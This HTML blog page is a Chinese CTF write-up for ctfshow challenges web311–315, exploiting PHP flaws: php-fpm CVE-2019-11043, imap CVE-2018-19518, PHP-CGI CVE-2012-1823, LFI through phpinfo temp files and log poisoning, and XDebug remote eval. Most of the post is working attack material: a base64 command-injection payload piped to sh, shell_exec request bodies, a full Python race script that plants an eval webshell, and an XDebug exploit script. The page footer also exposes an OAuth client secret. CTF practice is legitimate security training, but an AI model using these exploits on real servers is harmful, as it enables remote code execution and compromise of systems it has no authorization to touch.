@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]phpCVE | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web311
+根据服务器相应信息，PHP版本为PHP/7.1.33dev
+搜索相关CVE为CVE-2019-11043
+参考文章：
+https://blog.orange.tw/2019/10/an-analysis-and-thought..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]phpCVE</h2>
+            <div class="post-date">2024-04-23</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowphpcve.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web311">web311</h2>
+<p>根据服务器相应信息，PHP版本为PHP/7.1.33dev</p>
+<p>搜索相关CVE为CVE-2019-11043<br>
+参考文章：<br>
+https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html<br>
+https://lorexxar.cn/2019/10/25/php-fpm-rce</p>
+<p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</p>
+<p>Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>
+<pre><code> location ~ [^/]\.php(/|$) {
+
+    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
+
+    fastcgi_param PATH_INFO       $fastcgi_path_info;
+
+    fastcgi_pass   php:9000;
+
+    ...
+}
+</code></pre>
+<p>使用exp：https://github.com/neex/phuip-fpizdam</p>
+<p>payload利用不断添加参数名长度的方式来计算偏移距离<br>
+<img src="https://fallingskies22.github.io/post-images/1713857529144.png" alt="" loading="lazy"></p>
+<pre><code>go get -v &amp;&amp; go build
+go run . &quot;https://31e5daa1-de58-438b-ad95-df4f2b7b1c28.challenge.ctf.show/index.php&quot;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1713856124623.png" alt="" loading="lazy"></figure>
+<p>成功命令执行，需要多访问几次，不是每次都能成功。</p>
+<pre><code>https://31e5daa1-de58-438b-ad95-df4f2b7b1c28.challenge.ctf.show/index.php?a=whoami
+</code></pre>
+<h2 id="web312">web312</h2>
+<p>PHP imap 远程命令执行漏洞（CVE-2018-19518）</p>
+<p>参考文章：<br>
+https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518</p>
+<p>hp imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
+<p>因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<p>(尽量不要让注入命令中含有<code>+</code>，会被识别为空格)<br>
+payload</p>
+<pre><code>hostname=x+-oProxyCommand%3decho%09Y2F0IGN0ZnNob3dmbDRnPjEudHh0|base64%09-d|sh}&amp;username=111&amp;password=222
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1713859733202.png" alt="" loading="lazy"></figure>
+<h2 id="web313">web313</h2>
+<p>php版本为PHP/5.4.1</p>
+<p>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</p>
+<p>参考文章：<br>
+https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823</p>
+<p>影响版本 php &lt; 5.3.12 or php &lt; 5.4.2</p>
+<p>payload</p>
+<pre><code>POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
+
+&lt;?php echo shell_exec(&quot;cat /somewhere/fla9.txt&quot;); ?&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1713860511469.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1713860747166.png" alt="" loading="lazy"></figure>
+<h2 id="web314">web314</h2>
+<p>PHP文件包含漏洞（利用phpinfo）<br>
+参考文章：<br>
+https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</p>
+<p>PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p>
+<p>修改exp后还是跑不通(这里修改了host头，padding长度，因为原本长度5000会显示400，request too large)</p>
+<pre><code class="language-python">#!/usr/bin/python 
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG=&quot;Security Test&quot;
+    PAYLOAD=&quot;&quot;&quot;%s\r
+&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r&quot;&quot;&quot; % TAG
+    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD
+    padding=&quot;A&quot; * 4000
+    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&quot;&quot;&quot; %(len(REQ1_DATA),&quot;bab8beb8-644d-4309-82f5-7b943365419e.challenge.ctf.show&quot;,REQ1_DATA)
+    #modify this to suit the LFI script   
+    LFIREQ=&quot;&quot;&quot;GET /index.php?f=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+&quot;&quot;&quot;
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = &quot;&quot;
+    while len(d) &lt; offset:
+        d += s.recv(offset)
+    try:
+        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)
+        fn = d[i+17:i+31]
+    except ValueError:
+        return None
+
+    s2.send(lfireq % (fn, &quot;bab8beb8-644d-4309-82f5-7b943365419e.challenge.ctf.show&quot;))
+    d = s2.recv(4096)
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter &gt;= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break                
+                if x:
+                    print &quot;\nGot it! Shell created in /tmp/g&quot;
+                    self.event.set()
+                    
+            except socket.error:
+                return
+    
+
+def getOffset(host, port, phpinforeq):
+    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    print(phpinforeq)
+    s.send(phpinforeq)
+    
+    d = &quot;&quot;
+    while True:
+        i = s.recv(4096)
+        d+=i        
+        if i == &quot;&quot;:
+            break
+        # detect the final chunk
+        if i.endswith(&quot;0\r\n\r\n&quot;):
+            break 
+    s.close()
+    print(len(d))
+    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+    if i == -1:
+        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)
+    
+    print &quot;found %s at %i&quot; % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+
+def main():
+    
+    print &quot;LFI With PHPInfo()&quot;
+    print &quot;-=&quot; * 30
+
+    if len(sys.argv) &lt; 2:
+        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)
+        sys.exit(1)
+    
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)
+        sys.exit(1)
+
+    print &quot;Getting initial offset...&quot;,  
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print &quot;Spawning worker pool (%d)...&quot; % poolsz
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter &gt;= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print &quot;Woot!  \m/&quot;
+        else:
+            print &quot;:(&quot;
+    except KeyboardInterrupt:
+        print &quot;\nTelling threads to shutdown...&quot;
+        e.set()
+    
+    print &quot;Shuttin' down...&quot;
+    for t in tp:
+        t.join()
+
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre>
+<p>使用其它方法🤣<br>
+使用日志包含或者session包含都行</p>
+<pre><code class="language-python">import requests
+
+url = &quot;https://bab8beb8-644d-4309-82f5-7b943365419e.challenge.ctf.show/index.php&quot;
+
+headers = {
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&lt;?php @eval($_POST[1]); ?&gt;&quot;
+}
+
+data = {
+    1:&quot;system('cat /fl6g');&quot;
+}
+resp = requests.post(url+&quot;?f=/var/log/nginx/access.log&quot;,headers=headers,data=data)
+
+print(resp.text)
+</code></pre>
+<h2 id="web315">web315</h2>
+<p>XDebug 远程调试漏洞（代码执行）</p>
+<pre><code>xdebug.remote_connect_back = 1
+xdebug.remote_enable = 1
+</code></pre>
+<p>这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<p>参考文章：<br>
+https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce</p>
+<p>exp.py</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import re
+import sys
+import time
+import requests
+import argparse
+import socket
+import base64
+import binascii
+from concurrent.futures import ThreadPoolExecutor
+
+
+pool = ThreadPoolExecutor(1)
+session = requests.session()
+session.headers = {
+    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
+}
+
+def recv_xml(sock):
+    blocks = []
+    data = b''
+    while True:
+        try:
+            data = data + sock.recv(1024)
+        except socket.error as e:
+            break
+        if not data:
+            break
+
+        while data:
+            eop = data.find(b'\x00')
+            if eop &lt; 0:
+                break
+            blocks.append(data[:eop])
+            data = data[eop+1:]
+
+        if len(blocks) &gt;= 4:
+            break
+    
+    return blocks[3]
+
+
+def trigger(url):
+    time.sleep(2)
+    try:
+        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
+    except:
+        pass
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
+    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
+    parser.add_argument('-t', '--target', required=True, help='target url.')
+    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
+    args = parser.parse_args()
+    
+    ip_port = ('0.0.0.0', args.listen)
+    sk = socket.socket()
+    sk.settimeout(10)
+    sk.bind(ip_port)
+    sk.listen(5)
+
+    pool.submit(trigger, args.target)
+    conn, addr = sk.accept()
+    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
+
+    data = recv_xml(conn)
+    print('[+] Recieve data: ' + data.decode())
+    g = re.search(rb'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;', data, re.I)
+    if not g:
+        print('[-] No result...')
+        sys.exit(0)
+
+    data = g.group(1)
+
+    try:
+        print('[+] Result: ' + base64.b64decode(data).decode())
+    except binascii.Error:
+        print('[-] May be not string result...')
+</code></pre>
+<p>虽然脚本有-l可以指定端口，但用其他端口收不到响应。（vps的防火墙记得开放9000端口）</p>
+<p>使用备用环境，启动的环境也收不到响应。</p>
+<pre><code class="language-sh">python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c &quot;shell_exec('cat flaaaxx.php');&quot;
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1713868526172.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowzhong-ji-kao-he/">
+                  <h3 class="post-title">
+                    [ctfshow]终极考核
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
